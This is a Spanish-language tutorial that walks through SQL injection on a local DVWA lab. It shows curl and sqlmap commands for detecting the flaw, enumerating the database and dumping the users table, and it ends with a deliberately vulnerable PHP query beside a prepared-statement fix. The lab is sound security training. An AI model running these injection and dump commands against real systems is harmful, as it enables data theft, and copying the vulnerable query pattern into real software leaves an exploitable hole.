🔧 SQLi — Paso 0: Setup

Levantar DVWA y autenticarse (lab local).

# 1. Levantar DVWA
$ docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa
# Esperar 30 segundos (MySQL inicia)
 
# 2. Obtener token CSRF y loguearse
$ TOKEN=$(curl -s http://localhost/login.php | grep -oP "user_token.*value='\K[^']+")
$ curl -c cookies.txt -d "username=admin&password=password&Login=Login&user_token=$TOKEN" http://localhost/login.php
 
# 3. Verificar
$ curl -b cookies.txt http://localhost/ | grep "Security Level"
Security Level: low ✓

🔍 SQLi — Paso 1: Detección

Identificar la vulnerabilidad con comilla simple.

# Request normal
$ curl -b cookies.txt "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" | grep "First name"
First name: admin
 
# Request con comilla → ERROR = SQLi ✓
$ curl -b cookies.txt "http://localhost/vulnerabilities/sqli/?id=1'&Submit=Submit"
You have an error in your SQL syntax

💡 ¿Por qué funciona?

El servidor interpreta: SELECT * FROM users WHERE id='1''

La comilla extra rompe la query → ERROR CONFIRMADO

🗺️ SQLi — Paso 2: Enumeración

Usar sqlmap para mapear la base de datos.

# Obtener sesión para sqlmap
$ SESSID=$(grep PHPSESSID cookies.txt | awk '{print $NF}')
 
# 1. Listar bases de datos
$ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$SESSID; security=low" --batch --dbs
available databases [2]: [*] dvwa [*] information_schema
 
# 2. Listar tablas de dvwa
$ sqlmap -u "..." --batch -D dvwa --tables
[2 tables] | guestbook | users |

💎 SQLi — Paso 3: Extracción

Extraer datos sensibles (lab local DVWA).

# Dump completo de usuarios (LAB LOCAL)
$ sqlmap -u "..." --batch --dump -D dvwa -T users

🛡️ SQLi — Prevención

Cómo defenderse contra SQL Injection.

❌ VULNERABLE (PHP)

$id = $_GET['id'];
$query = "SELECT * FROM users 
           WHERE id = '$id'";
$result = mysqli_query($conn, $query);

Input concat directo en query

✅ SEGURO (PHP)

// Prepared Statements (PDO)
$stmt = $pdo->prepare(
  "SELECT * FROM users WHERE id = ?"
);
$stmt->execute([$_GET['id']]);
$result = $stmt->fetch();

Parámetros separados

1. Prepared Stmt

SIEMPRE

2. Least Privilege

DB sin admin

3. Input Valid.

Whitelist

4. WAF

Cloudflare, ModSecurity
